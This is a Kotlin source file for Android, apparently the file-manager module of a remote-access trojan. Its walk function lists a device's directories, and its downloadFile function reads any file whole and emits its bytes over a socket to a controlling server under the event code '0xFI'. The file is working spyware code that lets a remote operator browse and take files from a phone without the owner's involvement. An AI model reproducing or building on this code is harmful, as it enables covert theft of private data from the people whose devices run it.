package com.neaking

import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import org.json.JSONException
import java.io.*

object FileManager {
    fun walk(path: String?): JSONArray {


        // Read all files sorted into the values-array
        val values = JSONArray()
        val dir = File(path)
        if (!dir.canRead()) {
            Log.d("cannot", "inaccessible")
            try {
                val errorJson = JSONObject()
                errorJson.put("type", "error")
                errorJson.put("error", "Denied")
                ConnectionManager.mSocket?.emit("0xFI", errorJson)
                ConnectionManager.deletePendingRequest("0xFI")
              //  IOSocket.getInstance().getIoSocket().emit("0xFI", errorJson)
            } catch (e: JSONException) {
                e.printStackTrace()
            }
        }
        val list = dir.listFiles()
        try {
            if (list != null) {
                val parenttObj = JSONObject()
                parenttObj.put("name", "../")
                parenttObj.put("isDir", true)
                parenttObj.put("path", dir.parent)
                values.put(parenttObj)
                for (file in list) {
                    if (!file.name.startsWith(".")) {
                        val fileObj = JSONObject()
                        fileObj.put("name", file.name)
                        fileObj.put("isDir", file.isDirectory)
                        fileObj.put("path", file.absolutePath)
                        values.put(fileObj)
                    }
                }
            }
        } catch (e: JSONException) {
            e.printStackTrace()
        }
        return values
    }

    fun downloadFile(path: String?) {
        if (path == null) return
        val file = File(path)
        if (file.exists()) {
            val size = file.length().toInt()
            val data = ByteArray(size)
            try {
                val buf = BufferedInputStream(FileInputStream(file))
                buf.read(data, 0, data.size)
                val `object` = JSONObject()
                `object`.put("type", "download")
                `object`.put("name", file.name)
                `object`.put("buffer", data)

                ConnectionManager.mSocket?.emit("0xFI", `object`)
                ConnectionManager.deletePendingRequest("0xFI")
               // IOSocket.getInstance().getIoSocket().emit("0xFI", `object`)
                buf.close()
            } catch (e: FileNotFoundException) {
                e.printStackTrace()
            } catch (e: IOException) {
                e.printStackTrace()
            } catch (e: JSONException) {
                e.printStackTrace()
            }
        }
    }
}